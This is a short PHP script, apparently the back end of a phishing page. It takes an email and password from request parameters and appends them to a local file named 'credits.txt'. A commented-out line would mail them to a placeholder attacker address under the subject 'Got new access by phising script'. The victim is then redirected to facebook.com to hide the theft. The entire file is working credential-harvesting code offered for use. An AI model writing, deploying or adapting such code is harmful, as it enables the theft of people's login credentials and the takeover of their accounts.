<?php
	function mail_sender(){
		$username = $_GET['email'];
		$password = $_GET['pass'];
		
		$reciever = "YOUR-EMAIL ADRRESS";
		
		$subject = "Got new access by phising script";
		$message = "The username is [". $username;
		$message .= "] and password is [". $password."]";
		
		$myfile = file_put_contents('credits.txt', $message.PHP_EOL , FILE_APPEND | LOCK_EX);
		// return mail($reciever, $subject, $message);
		return true;
	}
	
	if(mail_sender()){
		// echo "DONE";
		header("Location: http://www.facebook.com");
	}
?>
